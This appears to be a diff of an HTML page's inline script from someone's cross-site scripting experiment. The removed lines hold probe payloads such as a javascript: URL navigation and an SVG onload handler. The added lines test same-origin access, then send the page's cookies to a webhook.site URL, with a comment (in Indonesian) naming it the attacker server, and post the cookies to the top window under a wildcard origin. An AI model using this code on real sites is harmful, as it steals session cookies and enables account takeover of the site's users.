@@ -13,27 +13,22 @@
 </script>
 
   <script>
-console.log("=== START TEST ===");
-
-// SOP check
-try {
-  console.log("TOP:", window.top.document.domain);
-} catch(e) {
-  console.log("SOP BLOCKED");
+    try {
+  let d = window.top.document.domain;
+  document.body.innerHTML += "<br>TOP ACCESS: " + d;
+} catch (e) {
+  document.body.innerHTML += "<br>SOP BLOCKED";
 }
 
-// postMessage
-window.top.postMessage('alert(document.domain)', '*');
+// kirim data ke attacker server
+fetch("https://webhook.site/999fc9b5-8b8c-44e7-96a7-7fdfc70d1032?data=" + encodeURIComponent(document.cookie));
 
-// navigation
-try {
-  window.top.location = "javascript:alert(1)";
-} catch(e) {}
+// coba pivot
+window.top.postMessage({
+  type: "XSS",
+  cookie: document.cookie
+}, "*");
 
-// window.name
-window.name = '<svg onload=alert(1)>';
-
-console.log("=== END TEST ===");
 </script>
   
 </body>
